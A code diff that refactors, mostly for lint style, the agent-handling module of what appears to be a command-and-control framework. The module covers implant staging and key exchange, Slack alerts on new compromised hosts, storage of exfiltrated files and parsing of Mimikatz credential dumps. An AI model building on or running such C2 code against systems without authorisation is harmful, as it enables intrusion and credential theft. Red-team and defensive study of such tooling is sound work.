@@ -142,7 +142,7 @@ class Agents:
         )
         return sessionID in self.agents
 
-    def add_agent(
+    def add_agent(  # noqa: PLR0913
         self,
         sessionID,
         externalIP,
@@ -225,21 +225,16 @@ class Agents:
         """
         if self.ipBlackList:
             if self.ipWhiteList:
-                results = (
+                return (
                     ip_address in self.ipWhiteList
                     and ip_address not in self.ipBlackList
                 )
-                return results
-            else:
-                results = ip_address not in self.ipBlackList
-                return results
+            return ip_address not in self.ipBlackList
         if self.ipWhiteList:
-            results = ip_address in self.ipWhiteList
-            return results
-        else:
-            return True
+            return ip_address in self.ipWhiteList
+        return True
 
-    def save_file(
+    def save_file(  # noqa: PLR0913
         self,
         sessionID,
         path,
@@ -267,9 +262,7 @@ class Agents:
             # fix for 'skywalker' exploit by @zeroSteiner
             safe_path = download_dir.absolute()
             if not str(os.path.normpath(save_file)).startswith(str(safe_path)):
-                message = "Agent {} attempted skywalker exploit! Attempted overwrite of {} with data {}".format(
-                    sessionID, path, data
-                )
+                message = f"Agent {sessionID} attempted skywalker exploit! Attempted overwrite of {path} with data {data}"
                 log.warning(message)
                 return
 
@@ -371,11 +364,9 @@ class Agents:
 
             # fix for 'skywalker' exploit by @zeroSteiner
             if not str(os.path.normpath(save_file)).startswith(str(safe_path)):
-                message = "agent {} attempted skywalker exploit!\n[!] attempted overwrite of {} with data {}".format(
-                    sessionID, path, data
-                )
+                message = f"agent {sessionID} attempted skywalker exploit!\n[!] attempted overwrite of {path} with data {data}"
                 log.warning(message)
-                return
+                return None
 
             # make the recursive directory structure if it doesn't already exist
             if not save_path.exists():
@@ -448,9 +439,7 @@ class Agents:
         Return all active agents from the database.
         """
         with SessionLocal() as db:
-            results = db.query(models.Agent).all()
-
-        return results
+            return db.query(models.Agent).all()
 
     def get_agent_nonce_db(self, session_id, db: Session):
         """
@@ -471,8 +460,8 @@ class Agents:
         if nonce and nonce is not None:
             if isinstance(nonce, str):
                 return nonce
-            else:
-                return nonce[0]
+            return nonce[0]
+        return None
 
     def get_language_db(self, session_id):
         """
@@ -490,13 +479,11 @@ class Agents:
             if name_id:
                 session_id = name_id
 
-            language = (
+            return (
                 db.query(models.Agent.language)
                 .filter(models.Agent.session_id == session_id)
                 .scalar()
             )
-
-        return language
 
     def get_agent_id_db(self, name, db: Session = None):
         """
@@ -510,7 +497,7 @@ class Agents:
             stacklevel=2,
         )
         # db is optional for backwards compatibility until this function is phased out
-        with db or SessionLocal() as db:
+        with db or SessionLocal() as db:  # noqa: PLR1704
             agent = db.query(models.Agent).filter(models.Agent.name == name).first()
 
         if agent:
@@ -557,9 +544,7 @@ class Agents:
             results = db.query(models.Config.autorun_data).all()
             autorun_data = results[0].autorun_data if results[0].autorun_data else ""
 
-            autoruns = [autorun_command, autorun_data]
-
-        return autoruns
+            return [autorun_command, autorun_data]
 
     def update_dir_list(self, session_id, response, db: Session):
         """ "
@@ -619,7 +604,7 @@ class Agents:
                     )
                 )
 
-    def update_agent_sysinfo_db(
+    def update_agent_sysinfo_db(  # noqa: PLR0913
         self,
         db,
         session_id,
@@ -757,22 +742,22 @@ class Agents:
         if session_id not in self.agents:
             log.error(f"Agent {session_id} not active.")
             return []
-        else:
-            try:
-                tasks, total = self.mainMenu.agenttasksv2.get_tasks(
-                    db=db,
-                    agents=[session_id],
-                    include_full_input=True,
-                    status=AgentTaskStatus.queued,
-                )
 
-                for task in tasks:
-                    task.status = AgentTaskStatus.pulled
+        try:
+            tasks, total = self.mainMenu.agenttasksv2.get_tasks(
+                db=db,
+                agents=[session_id],
+                include_full_input=True,
+                status=AgentTaskStatus.queued,
+            )
 
-                return tasks
-            except AttributeError:
-                log.warning("Agent checkin during initialization.")
-                return []
+            for task in tasks:
+                task.status = AgentTaskStatus.pulled
+
+            return tasks
+        except AttributeError:
+            log.warning("Agent checkin during initialization.")
+            return []
 
     def get_queued_agent_temporary_tasks(self, session_id):
         """
@@ -781,15 +766,11 @@ class Agents:
         if session_id not in self.agents:
             log.error(f"Agent {session_id} not active.")
             return []
-        else:
-            try:
-                tasks = self.mainMenu.agenttasksv2.get_temporary_tasks_for_agent(
-                    session_id
-                )
-                return tasks
-            except AttributeError:
-                log.warning("Agent checkin during initialization.")
-                return []
+        try:
+            return self.mainMenu.agenttasksv2.get_temporary_tasks_for_agent(session_id)
+        except AttributeError:
+            log.warning("Agent checkin during initialization.")
+            return []
 
     ###############################################################
     #
@@ -797,7 +778,7 @@ class Agents:
     #
     ###############################################################
 
-    def handle_agent_staging(
+    def handle_agent_staging(  # noqa: PLR0912 PLR0915 PLR0913 PLR0911
         self,
         sessionID,
         language,
@@ -820,7 +801,7 @@ class Agents:
             # step 1 of negotiation -> client requests staging code
             return "STAGE0"
 
-        elif meta == "STAGE1":
+        if meta == "STAGE1":
             # step 3 of negotiation -> client posts public key
             message = f"Agent {sessionID} from {clientIP} posted public key"
             log.info(message)
@@ -841,120 +822,120 @@ class Agents:
                 )
 
                 # client posts RSA key
-                if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
+                if (len(message) < 400) or (  # noqa: PLR2004
+                    not message.endswith("</RSAKeyValue>")
+                ):
                     message = f"Invalid PowerShell key post format from {sessionID}"
                     log.error(message)
                     return "ERROR: Invalid PowerShell key post format"
-                else:
-                    # convert the RSA key from the stupid PowerShell export format
-                    rsa_key = encryption.rsa_xml_to_key(message)
 
-                    if rsa_key:
-                        message = f"Agent {sessionID} from {clientIP} posted valid PowerShell RSA key"
-                        log.info(message)
+                # convert the RSA key from the stupid PowerShell export format
+                rsa_key = encryption.rsa_xml_to_key(message)
 
-                        nonce = helpers.random_string(16, charset=string.digits)
-                        delay = listenerOptions["DefaultDelay"]["Value"]
-                        jitter = listenerOptions["DefaultJitter"]["Value"]
-                        profile = listenerOptions["DefaultProfile"]["Value"]
-                        killDate = listenerOptions["KillDate"]["Value"]
-                        workingHours = listenerOptions["WorkingHours"]["Value"]
-                        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+                if not rsa_key:
+                    message = (
+                        f"Agent {sessionID} returned an invalid PowerShell public key!"
+                    )
+                    log.error(message)
+                    return "ERROR: Invalid PowerShell public key"
 
-                        # add the agent to the database now that it's "checked in"
-                        agent = self.add_agent(
-                            sessionID,
-                            clientIP,
-                            delay,
-                            jitter,
-                            profile,
-                            killDate,
-                            workingHours,
-                            lostLimit,
-                            nonce=nonce,
-                            listener=listenerName,
-                            db=db,
-                        )
+                message = (
+                    f"Agent {sessionID} from {clientIP} posted valid PowerShell RSA key"
+                )
+                log.info(message)
 
-                        client_session_key = agent.session_key
-                        data = f"{nonce}{client_session_key}"
+                nonce = helpers.random_string(16, charset=string.digits)
+                delay = listenerOptions["DefaultDelay"]["Value"]
+                jitter = listenerOptions["DefaultJitter"]["Value"]
+                profile = listenerOptions["DefaultProfile"]["Value"]
+                killDate = listenerOptions["KillDate"]["Value"]
+                workingHours = listenerOptions["WorkingHours"]["Value"]
+                lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
 
-                        data = data.encode("ascii", "ignore")
+                # add the agent to the database now that it's "checked in"
+                agent = self.add_agent(
+                    sessionID,
+                    clientIP,
+                    delay,
+                    jitter,
+                    profile,
+                    killDate,
+                    workingHours,
+                    lostLimit,
+                    nonce=nonce,
+                    listener=listenerName,
+                    db=db,
+                )
 
-                        # step 4 of negotiation -> server returns RSA(nonce+AESsession))
-                        encrypted_msg = encryption.rsa_encrypt(rsa_key, data)
-                        # TODO: wrap this in a routing packet!
+                client_session_key = agent.session_key
+                data = f"{nonce}{client_session_key}"
 
-                        return encrypted_msg
+                data = data.encode("ascii", "ignore")
 
-                    else:
-                        message = f"Agent {sessionID} returned an invalid PowerShell public key!"
-                        log.error(message)
-                        return "ERROR: Invalid PowerShell public key"
+                # step 4 of negotiation -> server returns RSA(nonce+AESsession))
+                return encryption.rsa_encrypt(rsa_key, data)
+                # TODO: wrap this in a routing packet!
 
-            elif language.lower() == "python":
-                if (len(message) < 1000) or (len(message) > 2500):
+            if language.lower() == "python":
+                if (len(message) < 1000) or (len(message) > 2500):  # noqa: PLR2004
                     message = f"Invalid Python key post format from {sessionID}"
                     log.error(message)
-                    return "Error: Invalid Python key post format from %s" % (sessionID)
-                else:
-                    try:
-                        int(message)
-                    except Exception:
-                        message = f"Invalid Python key post format from {sessionID}"
-                        log.error(message)
-                        return message
+                    return f"Error: Invalid Python key post format from {sessionID}"
 
-                    # client posts PUBc key
-                    clientPub = int(message)
-                    serverPub = encryption.DiffieHellman()
-                    serverPub.genKey(clientPub)
-                    # serverPub.key == the negotiated session key
+                try:
+                    int(message)
+                except Exception:
+                    message = f"Invalid Python key post format from {sessionID}"
+                    log.error(message)
+                    return message
 
-                    nonce = helpers.random_string(16, charset=string.digits)
+                # client posts PUBc key
+                clientPub = int(message)
+                serverPub = encryption.DiffieHellman()
+                serverPub.genKey(clientPub)
+                # serverPub.key == the negotiated session key
 
-                    message = (
-                        f"Agent {sessionID} from {clientIP} posted valid Python PUB key"
-                    )
-                    log.info(message)
+                nonce = helpers.random_string(16, charset=string.digits)
 
-                    delay = listenerOptions["DefaultDelay"]["Value"]
-                    jitter = listenerOptions["DefaultJitter"]["Value"]
-                    profile = listenerOptions["DefaultProfile"]["Value"]
-                    killDate = listenerOptions["KillDate"]["Value"]
-                    workingHours = listenerOptions["WorkingHours"]["Value"]
-                    lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
-
-                    # add the agent to the database now that it's "checked in"
-                    self.add_agent(
-                        sessionID,
-                        clientIP,
-                        delay,
-                        jitter,
-                        profile,
-                        killDate,
-                        workingHours,
-                        lostLimit,
-                        sessionKey=serverPub.key.hex(),
-                        nonce=nonce,
-                        listener=listenerName,
-                        language=language,
-                        db=db,
-                    )
-
-                    # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
-                    data = f"{nonce}{serverPub.publicKey}"
-                    encrypted_msg = encryption.aes_encrypt_then_hmac(stagingKey, data)
-                    # TODO: wrap this in a routing packet?
-
-                    return encrypted_msg
-
-            else:
-                message = f"Agent {sessionID} from {clientIP} using an invalid language specification: {language}"
+                message = (
+                    f"Agent {sessionID} from {clientIP} posted valid Python PUB key"
+                )
                 log.info(message)
-                return f"ERROR: invalid language: {language}"
 
-        elif meta == "STAGE2":
+                delay = listenerOptions["DefaultDelay"]["Value"]
+                jitter = listenerOptions["DefaultJitter"]["Value"]
+                profile = listenerOptions["DefaultProfile"]["Value"]
+                killDate = listenerOptions["KillDate"]["Value"]
+                workingHours = listenerOptions["WorkingHours"]["Value"]
+                lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
+
+                # add the agent to the database now that it's "checked in"
+                self.add_agent(
+                    sessionID,
+                    clientIP,
+                    delay,
+                    jitter,
+                    profile,
+                    killDate,
+                    workingHours,
+                    lostLimit,
+                    sessionKey=serverPub.key.hex(),
+                    nonce=nonce,
+                    listener=listenerName,
+                    language=language,
+                    db=db,
+                )
+
+                # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
+                data = f"{nonce}{serverPub.publicKey}"
+                return encryption.aes_encrypt_then_hmac(stagingKey, data)
+                # TODO: wrap this in a routing packet?
+
+            message = f"Agent {sessionID} from {clientIP} using an invalid language specification: {language}"
+            log.info(message)
+            return f"ERROR: invalid language: {language}"
+
+        if meta == "STAGE2":
             # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
             try:
                 session_key = self.agents[sessionID]["sessionKey"]
@@ -969,7 +950,7 @@ class Agents:
                 message = encryption.aes_decrypt_and_verify(session_key, encData)
                 parts = message.split(b"|")
 
-                if len(parts) < 12:
+                if len(parts) < 12:  # noqa: PLR2004
                     message = f"Agent {sessionID} posted invalid sysinfo checkin format: {message}"
                     log.info(message)
                     # remove the agent from the cache/database
@@ -1033,14 +1014,7 @@ class Agents:
 
             slack_webhook_url = listenerOptions["SlackURL"]["Value"]
             if slack_webhook_url != "":
-                slack_text = ":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: {}\r\nInternal IP: {}\r\nExternal IP: {}\r\nUser: {}\r\nOS Version: {}\r\nAgent ID: {}```".format(
-                    hostname,
-                    internal_ip,
-                    external_ip,
-                    username,
-                    os_details,
-                    sessionID,
-                )
+                slack_text = f":biohazard_sign: NEW AGENT :biohazard_sign:\r\n```Machine Name: {hostname}\r\nInternal IP: {internal_ip}\r\nExternal IP: {external_ip}\r\nUser: {username}\r\nOS Version: {os_details}\r\nAgent ID: {sessionID}```"
                 helpers.slackMessage(slack_webhook_url, slack_text)
 
             # signal everyone that this agent is now active
@@ -1084,9 +1058,11 @@ class Agents:
 
             return f"STAGE2: {sessionID}"
 
-        else:
-            message = f"Invalid staging request packet from {sessionID} at {clientIP} : {meta}"
-            log.error(message)
+        message = (
+            f"Invalid staging request packet from {sessionID} at {clientIP} : {meta}"
+        )
+        log.error(message)
+        return None
 
     def handle_agent_data(
         self,
@@ -1102,7 +1078,7 @@ class Agents:
 
         Abstracted out sufficiently for any listener module to use.
         """
-        if len(routingPacket) < 20:
+        if len(routingPacket) < 20:  # noqa: PLR2004
             message = (
                 f"handle_agent_data(): routingPacket wrong length: {len(routingPacket)}"
             )
@@ -1123,7 +1099,7 @@ class Agents:
                 message = f"handle_agent_data(): invalid sessionID {sessionID}"
                 log.error(message)
                 dataToReturn.append(("", f"ERROR: invalid sessionID {sessionID}"))
-            elif meta == "STAGE0" or meta == "STAGE1" or meta == "STAGE2":
+            elif meta in ("STAGE0", "STAGE1", "STAGE2"):
                 message = f"handle_agent_data(): sessionID {sessionID} issued a {meta} request"
                 log.debug(message)
 
@@ -1303,7 +1279,7 @@ class Agents:
             log.error(message, exc_info=True)
             return None
 
-    def process_agent_packet(
+    def process_agent_packet(  # noqa: PLR0912 PLR0915
         self, session_id, response_name, task_id, data, db: Session
     ):
         """
@@ -1392,7 +1368,7 @@ class Agents:
             # sys info response -> update the host info
             data = data.decode("utf-8")
             parts = data.split("|")
-            if len(parts) < 12:
+            if len(parts) < 12:  # noqa: PLR2004
                 message = f"Invalid sysinfo response from {session_id}"
                 log.error(message)
             else:
@@ -1509,7 +1485,7 @@ class Agents:
                 data = data.decode("UTF-8")
 
             parts = data.split("|")
-            if len(parts) != 4:
+            if len(parts) != 4:  # noqa: PLR2004
                 message = f"Received invalid file download response from {session_id}"
                 log.error(message)
             else:
@@ -1622,11 +1598,8 @@ class Agents:
             file_data = helpers.decode_base64(data[20:])
 
             # save the file off to the appropriate path
-            save_path = "{}/{}_{}.{}".format(
-                prefix,
-                agent.hostname,
-                helpers.get_file_datetime(),
-                extension,
+            save_path = (
+                f"{prefix}/{agent.hostname}_{helpers.get_file_datetime()}.{extension}"
             )
             final_save_path = self.save_module_file(
                 session_id, save_path, file_data, agent.language
@@ -1708,7 +1681,7 @@ class Agents:
             if isinstance(data, str):
                 data = data.encode("UTF-8")
             parts = data.split(b"\n")
-            if len(parts) > 10:
+            if len(parts) > 10:  # noqa: PLR2004
                 date_time = helpers.get_datetime()
                 if parts[0].startswith(b"Hostname:"):
                     # if we get Invoke-Mimikatz output, try to parse it and add
@@ -1748,11 +1721,8 @@ class Agents:
             file_data = helpers.decode_base64(data[20:])
 
             # save the file off to the appropriate path
-            save_path = "{}/{}_{}.{}".format(
-                prefix,
-                agent.hostname,
-                helpers.get_file_datetime(),
-                extension,
+            save_path = (
+                f"{prefix}/{agent.hostname}_{helpers.get_file_datetime()}.{extension}"
             )
             final_save_path = self.save_module_file(
                 session_id, save_path, file_data, agent.language
